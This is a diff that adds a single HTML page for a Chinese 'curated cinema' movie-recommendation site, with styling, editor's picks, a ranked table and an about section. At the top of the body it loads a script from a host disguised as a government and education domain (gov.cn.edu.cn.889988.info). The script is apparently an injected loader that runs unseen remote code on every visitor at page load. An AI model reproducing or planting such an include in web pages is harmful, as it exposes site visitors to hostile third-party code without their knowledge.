@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>优质电影网 - 精选好片 · 编辑推荐的优质电影在线观看</title>
+<meta name="description" content="优质电影网（youzhidianyingwang-h5）由编辑团队精选优质电影、高分佳片、独立佳作，提供高清在线观看导航，拒绝烂片，只看好片。">
+<meta name="keywords" content="优质电影网,精选电影,高分佳片,编辑推荐,独立电影,免费在线观看">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#faf7f2;
+  --ink:#1a1a1a;
+  --red:#c0392b;
+  --green:#2c5f2d;
+  --blue:#1a5276;
+  --gold:#b8860b;
+  --text:#222;
+  --muted:#777;
+  --card:#fff;
+  --line:#ddd5c8;
+  --shadow:rgba(0,0,0,.06);
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Serif SC","Georgia","SimSun",serif;
+  background:var(--bg);
+  color:var(--text);
+  line-height:1.8;
+  overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+
+/* 编辑信 Header */
+.masthead{
+  max-width:1150px;margin:auto;padding:26px 20px 20px;
+  display:flex;align-items:flex-end;justify-content:space-between;flex-wrap:wrap;gap:14px;
+  border-bottom:1px solid var(--line);
+}
+.brand h1{font-size:34px;font-weight:900;color:var(--ink);letter-spacing:2px;font-family:"Noto Serif SC",serif}
+.brand .tagline{font-size:12px;color:var(--muted);font-style:italic;margin-top:2px;letter-spacing:1px}
+.issue{text-align:right;font-size:11px;color:var(--muted);font-family:"Courier New",monospace}
+.issue strong{display:block;font-size:13px;color:var(--ink);letter-spacing:1px}
+
+/* 导航 */
+.editor-nav{max-width:1150px;margin:auto;padding:10px 20px;display:flex;flex-wrap:wrap;gap:2px;border-bottom:3px solid var(--ink)}
+.editor-nav a{
+  padding:6px 14px;font-size:13px;color:var(--muted);
+  border-right:1px solid var(--line);transition:.3s;font-family:"Noto Serif SC",serif;
+}
+.editor-nav a:last-child{border-right:none}
+.editor-nav a:hover{color:var(--ink);background:rgba(0,0,0,.03)}
+
+/* 主容器 */
+.wrap{max-width:1150px;margin:auto;padding:0 20px}
+
+/* 卷首专题 */
+.editorial{margin-top:26px;background:var(--card);border-radius:4px;overflow:hidden;box-shadow:0 4px 20px var(--shadow);display:grid;grid-template-columns:1.2fr 1fr;gap:0}
+@media(max-width:800px){.editorial{grid-template-columns:1fr}}
+.editorial .photo{height:100%;min-height:320px;overflow:hidden}
+.editorial .photo img{width:100%;height:100%;object-fit:cover;transition:.6s}
+.editorial:hover .photo img{transform:scale(1.04)}
+.editorial .text{padding:32px 28px;display:flex;flex-direction:column;justify-content:center}
+.editorial .kicker{font-size:11px;letter-spacing:3px;color:var(--red);font-weight:700;text-transform:uppercase;margin-bottom:8px}
+.editorial h2{font-size:26px;line-height:1.35;color:var(--ink);margin-bottom:12px;font-family:"Noto Serif SC",serif}
+.editorial p{font-size:14px;color:var(--muted);margin-bottom:16px}
+.editorial .byline{font-size:11px;color:var(--muted);font-style:italic;border-top:1px solid var(--line);padding-top:10px}
+.editorial .byline strong{color:var(--ink)}
+.read-btn{
+  display:inline-block;align-self:flex-start;padding:8px 20px;background:var(--ink);color:#fff;
+  font-size:12px;letter-spacing:2px;transition:.3s;border-radius:2px;
+}
+.read-btn:hover{background:var(--red)}
+
+/* 栏目标题 */
+.section{margin-top:44px}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:20px;padding-bottom:8px;border-bottom:1px solid var(--line)}
+.sec-head .num{font-size:12px;color:var(--red);font-weight:900;font-family:"Courier New",monospace}
+.sec-head h2{font-size:22px;font-weight:900;color:var(--ink);font-family:"Noto Serif SC",serif}
+.sec-head .en{font-size:11px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-left:auto;font-family:"Courier New",monospace}
+
+/* 栏目1：编辑精选（评论卡） */
+.picks{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:20px}
+.pick{
+  background:var(--card);border-radius:4px;overflow:hidden;
+  box-shadow:0 3px 14px var(--shadow);transition:.35s;
+}
+.pick:hover{transform:translateY(-5px);box-shadow:0 10px 28px rgba(0,0,0,.12)}
+.pick .thumb{height:200px;overflow:hidden}
+.pick .thumb img{width:100%;height:100%;object-fit:cover;filter:saturate(.9);transition:.5s}
+.pick:hover .thumb img{transform:scale(1.06);filter:saturate(1.1)}
+.pick .body{padding:18px}
+.pick .body .genre{font-size:10px;letter-spacing:2px;color:var(--green);font-weight:700;text-transform:uppercase}
+.pick .body h4{font-size:17px;color:var(--ink);margin:6px 0 8px;line-height:1.4}
+.pick .body .excerpt{font-size:13px;color:var(--muted);line-height:1.7}
+.pick .body .rating{display:flex;align-items:center;gap:8px;margin-top:12px;padding-top:10px;border-top:1px solid var(--line)}
+.pick .body .stars{color:var(--gold);font-size:13px}
+.pick .body .score{font-size:15px;font-weight:900;color:var(--ink)}
+
+/* 栏目2：分类目录 */
+.cat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px}
+.cat-dir{
+  background:var(--card);border:1px solid var(--line);border-left:4px solid var(--c);
+  border-radius:3px;padding:20px 16px;cursor:pointer;transition:.3s;
+}
+.cat-dir:hover{background:var(--c);border-color:var(--c)}
+.cat-dir:hover *{color:#fff !important}
+.cat-dir h4{font-size:15px;color:var(--ink);transition:.3s}
+.cat-dir p{font-size:11px;color:var(--muted);margin-top:4px;transition:.3s}
+.cat-dir:nth-child(1){--c:var(--red)}
+.cat-dir:nth-child(2){--c:var(--green)}
+.cat-dir:nth-child(3){--c:var(--blue)}
+.cat-dir:nth-child(4){--c:var(--gold)}
+.cat-dir:nth-child(5){--c:#6c3483}
+.cat-dir:nth-child(6){--c:#e67e22}
+
+/* 栏目3：编辑之选（表格） */
+.edit-table{width:100%;border-collapse:collapse;background:var(--card);box-shadow:0 3px 14px var(--shadow);border-radius:4px;overflow:hidden}
+.edit-table th{background:var(--ink);color:#fff;padding:12px 14px;text-align:left;font-size:12px;letter-spacing:1px;font-weight:400}
+.edit-table td{padding:14px;border-bottom:1px solid var(--line);font-size:14px;color:var(--text);vertical-align:middle}
+.edit-table tr:last-child td{border-bottom:none}
+.edit-table tr:hover td{background:rgba(192,57,43,.04)}
+.edit-table .no{font-weight:900;color:var(--red);font-family:"Courier New",monospace;width:40px}
+.edit-table .film-title{font-weight:700;color:var(--ink)}
+.edit-table .film-title small{display:block;font-size:11px;color:var(--muted);font-weight:400;margin-top:2px}
+.edit-table .verdict{font-size:12px;color:var(--green);font-style:italic}
+.edit-table .score-cell{font-weight:900;color:var(--ink);font-size:16px;text-align:center;width:60px}
+
+/* 栏目4：关于 */
+.about{
+  background:var(--card);border-radius:4px;padding:32px;
+  box-shadow:0 4px 20px var(--shadow);border-top:4px solid var(--red);
+}
+.about h2{font-size:22px;color:var(--ink);margin-bottom:14px;font-family:"Noto Serif SC",serif}
+.about p{font-size:14px;color:var(--muted);margin-bottom:10px}
+.about a{color:var(--red);font-weight:700;border-bottom:1px solid rgba(192,57,43,.3)}
+.about .manifesto{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-top:20px}
+.manifesto-item{padding:16px;border:1px solid var(--line);border-radius:3px}
+.manifesto-item h4{font-size:14px;color:var(--ink);margin-bottom:6px}
+.manifesto-item p{font-size:12px;color:var(--muted);margin:0}
+
+/* 页脚 */
+.footer{margin-top:50px;padding:28px 20px;text-align:center;border-top:1px solid var(--line);color:var(--muted);font-size:12px;background:var(--card)}
+.footer a{color:var(--ink);font-weight:700}
+.footer .colophon{font-size:10px;color:#aaa;margin-top:8px;font-style:italic}
+
+@media(max-width:768px){
+  .brand h1{font-size:24px}
+  .issue{text-align:left}
+  .editorial .photo{min-height:220px}
+  .picks{grid-template-columns:1fr}
+  .edit-table{font-size:12px}
+  .edit-table th,.edit-table td{padding:8px 10px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 编辑信 Header -->
+<header class="masthead">
+  <div class="brand">
+    <h1>优质电影网</h1>
+    <div class="tagline">— 拒绝烂片，只看好片 · A Curated Cinema —</div>
+  </div>
+  <div class="issue">
+    <strong>EDITOR'S CHOICE</strong>
+    VOL.10 · OCT 2024<br>
+    YOUZHIDIANYINGWANG-H5
+  </div>
+</header>
+
+<!-- 编辑导航 -->
+<nav class="editor-nav">
+  <a href="#">首页</a>
+  <a href="#picks">编辑精选</a>
+  <a href="#catalog">分类目录</a>
+  <a href="#editor">编辑之选</a>
+  <a href="#about">关于我们</a>
+</nav>
+
+<div class="wrap">
+
+  <!-- 卷首专题 -->
+  <section class="editorial">
+    <div class="photo"><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=600&q=80" alt="卷首专题配图"></div>
+    <div class="text">
+      <div class="kicker">本 期 卷 首</div>
+      <h2>在算法之外，重新发现电影</h2>
+      <p>当推荐算法不断把相似的影片推到你面前，我们决定回归最原始的方式——由真实的人，一部一部地看，一部一部地选。本期我们精选了 12 部值得你花时间的好电影，涵盖冷门佳作、经典重映与年度惊喜。</p>
+      <div class="byline">编辑 · <strong>优质电影网编辑部</strong> ｜ 阅读时间约 8 分钟</div>
+      <a href="#" class="read-btn">阅 读 全 文 →</a>
+    </div>
+  </section>
+
+  <!-- 栏目1：编辑精选 -->
+  <section class="section" id="picks">
+    <div class="sec-head"><span class="num">01</span><h2>编辑精选</h2><span class="en">Editor's Picks</span></div>
+    <div class="picks">
+      <article class="pick"><div class="thumb"><img src="https://images.unsplash.com/photo-1524985069026-ddb1d3e1b1a4?w=400&q=80" alt="影片一"></div><div class="body"><div class="genre">科幻 / Sci-Fi</div><h4>沙丘：第二部</h4><p class="excerpt">维伦纽瓦将科幻史诗推向极致，视听语言的教科书级示范，每一帧都是壁纸。</p><div class="rating"><span class="stars">★★★★★</span><span class="score">9.8</span></div></div></article>
+      <article class="pick"><div class="thumb"><img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?w=400&q=80" alt="影片二"></div><div class="body"><div class="genre">悬疑 / Thriller</div><h4>坠落的审判</h4><p class="excerpt">一场坠楼引发的婚姻解剖，剧本精妙如瑞士钟表，戛纳金棕榈实至名归。</p><div class="rating"><span class="stars">★★★★★</span><span class="score">9.5</span></div></div></article>
+      <article class="pick"><div class="thumb"><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=400&q=80" alt="影片三"></div><div class="body"><div class="genre">犯罪 / Crime</div><h4>花月杀手</h4><p class="excerpt">斯科塞斯用 206 分钟讲述一段被遗忘的屠杀史，莱昂纳多奉献了职业生涯最克制的表演。</p><div class="rating"><span class="stars">★★★★☆</span><span class="score">9.2</span></div></div></article>
+      <article class="pick"><div class="thumb"><img src="https://images.unsplash.com/photo-1489593908472-4d1a72d5d1b9?w=400&q=80" alt="影片四"></div><div class="body"><div class="genre">动画 / Animation</div><h4>蜘蛛侠：纵横宇宙</h4><p class="excerpt">把整个动画史搬上银幕的实验性杰作，每一分钟都在重新定义「视觉奇观」。</p><div class="rating"><span class="stars">★★★★★</span><span class="score">9.4</span></div></div></article>
+      <article class="pick"><div class="thumb"><img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=400&q=80" alt="影片五"></div><div class="body"><div class="genre">喜剧 / Comedy</div><h4>芭比</h4><p class="excerpt">一场粉色糖衣包裹的性别寓言，笑着笑着就哭了，商业与作者性的罕见平衡。</p><div class="rating"><span class="stars">★★★★☆</span><span class="score">8.9</span></div></div></article>
+      <article class="pick"><div class="thumb"><img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=400&q=80" alt="影片六"></div><div class="body"><div class="genre">剧情 / Drama</div><h4>美国小说</h4><p class="excerpt">用喜剧的方式解剖美国文学圈的虚伪，节奏精准，笑点密集，年度最被低估的黑马。</p><div class="rating"><span class="stars">★★★★☆</span><span class="score">8.7</span></div></div></article>
+    </div>
+  </section>
+
+  <!-- 栏目2：分类目录 -->
+  <section class="section" id="catalog">
+    <div class="sec-head"><span class="num">02</span><h2>分类目录</h2><span class="en">Categories</span></div>
+    <div class="cat-grid">
+      <div class="cat-dir"><h4>剧情 Drama</h4><p>142 部精选</p></div>
+      <div class="cat-dir"><h4>科幻 Sci-Fi</h4><p>68 部精选</p></div>
+      <div class="cat-dir"><h4>悬疑 Thriller</h4><p>95 部精选</p></div>
+      <div class="cat-dir"><h4>文艺 Art-house</h4><p>203 部精选</p></div>
+      <div class="cat-dir"><h4>纪录片 Doc</h4><p>56 部精选</p></div>
+      <div class="cat-dir"><h4>经典 Classic</h4><p>310 部精选</p></div>
+    </div>
+  </section>
+
+  <!-- 栏目3：编辑之选 -->
+  <section class="section" id="editor">
+    <div class="sec-head"><span class="num">03</span><h2>编辑之选</h2><span class="en">Editor's Top 8</span></div>
+    <table class="edit-table">
+      <thead><tr><th>#</th><th>影片</th><th>类型</th><th>编辑评语</th><th style="text-align:center">评分</th></tr></thead>
+      <tbody>
+        <tr><td class="no">01</td><td class="film-title">奥本海默<small>Christopher Nolan · 2023</small></td><td>传记</td><td class="verdict">视听与叙事的双重巅峰</td><td class="score-cell">9.9</td></tr>
+        <tr><td class="no">02</td><td class="film-title">沙丘：第二部<small>Denis Villeneuve · 2024</small></td><td>科幻</td><td class="verdict">科幻史诗的终极形态</td><td class="score-cell">9.8</td></tr>
+        <tr><td class="no">03</td><td class="film-title">坠落的审判<small>Justine Triet · 2023</small></td><td>悬疑</td><td class="verdict">剧本精妙如瑞士钟表</td><td class="score-cell">9.5</td></tr>
+        <tr><td class="no">04</td><td class="film-title">花月杀手<small>Martin Scorsese · 2023</small></td><td>犯罪</td><td class="verdict">被遗忘的历史伤口</td><td class="score-cell">9.2</td></tr>
+        <tr><td class="no">05</td><td class="film-title">蜘蛛侠：纵横宇宙<small>2023</small></td><td>动画</td><td class="verdict">动画艺术的革命</td><td class="score-cell">9.4</td></tr>
+        <tr><td class="no">06</td><td class="film-title">过往人生<small>Celine Song · 2023</small></td><td>爱情</td><td class="verdict">克制到极致的东方情感</td><td class="score-cell">9.1</td></tr>
+        <tr><td class="no">07</td><td class="film-title">利益区域<small>Jonathan Glazer · 2023</small></td><td>剧情</td><td class="verdict">最冷静也最恐怖的控诉</td><td class="score-cell">9.3</td></tr>
+        <tr><td class="no">08</td><td class="film-title">留校联盟<small>Alexander Payne · 2023</small></td><td>喜剧</td><td class="verdict">温暖又心酸的年末治愈</td><td class="score-cell">8.8</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- 栏目4：关于 -->
+  <section class="section" id="about">
+    <div class="sec-head"><span class="num">04</span><h2>关于我们</h2><span class="en">About Us</span></div>
+    <div class="about">
+      <h2>📖 优质电影网 · 编辑精选</h2>
+      <p>优质电影网（youzhidianyingwang-h5）不是一个算法驱动的影视站。我们相信，选片是一件需要人的事——需要时间、品味、判断力，以及对电影本身的尊重。</p>
+      <p>每一部出现在网站上的影片，都经过了编辑团队的实际观看与讨论。我们只推荐值得你花时间的好电影，并且坦诚地告诉你它好在哪里、可能不适合谁。</p>
+      <div class="manifesto">
+        <div class="manifesto-item"><h4>拒绝烂片</h4><p>不追热点，不上烂片，宁缺毋滥。</p></div>
+        <div class="manifesto-item"><h4>真实观看</h4><p>每部影片都由编辑实际观看后撰写推荐理由。</p></div>
+        <div class="manifesto-item"><h4>多元视角</h4><p>涵盖商业大片、独立佳作、经典老片、纪录片。</p></div>
+        <div class="manifesto-item"><h4>持续更新</h4><p>每周更新片单，紧跟全球优质新片。</p></div>
+      </div>
+      <p style="margin-top:20px">网站名称：<strong style="color:var(--red)">优质电影网</strong><br>
+         网站网址：<a href="https://youzhidianyingwang-h5.github.io">https://youzhidianyingwang-h5.github.io</a></p>
+      <p>本站仅做影视信息展示与导航，资源来自互联网，如有侵权请联系删除。</p>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <p>© 2024 优质电影网 ｜ 网站名称：优质电影网 ｜ 网址：<a href="https://youzhidianyingwang-h5.github.io">youzhidianyingwang-h5.github.io</a></p>
+  <div class="colophon">Set in Noto Serif & Courier · Printed on the Web · 杂志编辑风单页演示 · 内链 # 占位 · 未生成 robots.txt / sitemap.xml</div>
+</footer>
+
+</body>
+</html>
